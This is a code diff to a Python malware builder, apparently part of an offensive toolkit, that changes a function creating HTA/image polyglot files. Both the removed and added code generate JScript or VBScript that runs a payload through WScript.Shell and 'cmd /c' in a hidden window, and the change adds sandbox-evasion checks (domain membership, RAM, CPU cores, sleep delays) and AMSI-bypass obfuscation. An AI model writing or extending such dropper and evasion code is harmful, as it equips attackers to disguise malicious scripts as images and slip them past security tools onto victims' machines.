@@ -31,31 +31,44 @@ class UniversalEngine:
         return data[idx + len(delimiter):]
 
     @staticmethod
-    def create_hta_polyglot(image_path, script_content, output_path, obfuscate=True):
+    def create_hta_polyglot(image_path, script_content, output_path, obfuscate=True, 
+                            check_domain=False, min_ram_gb=4, min_cores=2, sleep_ms=0):
         """
-        Creates an HTA/Image polyglot with optional obfuscation.
+        Creates an HTA/Image polyglot with optional obfuscation and sandbox evasion.
         Uses a JavaScript-based HTA to bypass simple VBScript signatures.
         """
+        from evasion_engine import EvasionEngine
+        
         if obfuscate:
-            # Simple Base64 + eval obfuscation for the payload
-            import base64
-            encoded_payload = base64.b64encode(script_content.encode()).decode()
-            
             # AMSI Bypass / Evasion pattern: String splitting and dynamic reconstruction
+            # We use the advanced JScript evasion wrapper from the Evasion Engine
+            raw_script_block = EvasionEngine.wrap_jscript(
+                payload=script_content, 
+                check_domain=check_domain,
+                min_ram_gb=min_ram_gb,
+                min_cores=min_cores,
+                sleep_ms=sleep_ms
+            )
+            
             script_block = f"""
             <script language="JScript">
-                var _0x1a2b = ["{encoded_payload}", "atob", "eval"];
-                var payload = window[_0x1a2b[1]](_0x1a2b[0]);
-                var shell = new ActiveXObject("WScript.Shell");
-                shell.Run("cmd /c " + payload, 0, true);
+                {raw_script_block}
                 window.close();
             </script>
             """
         else:
+            # Minimal wrapper that doesn't attempt base64 parsing 
+            raw_script_block = EvasionEngine.wrap_vbscript(
+                payload=script_content,
+                check_domain=check_domain,
+                min_ram_gb=min_ram_gb,
+                min_cores=min_cores,
+                sleep_ms=sleep_ms
+            )
+            
             script_block = f"""
             <script language="VBScript">
-                Set objShell = CreateObject("WScript.Shell")
-                objShell.Run "cmd /c {script_content}", 0, True
+                {raw_script_block}
                 self.close
             </script>
             """
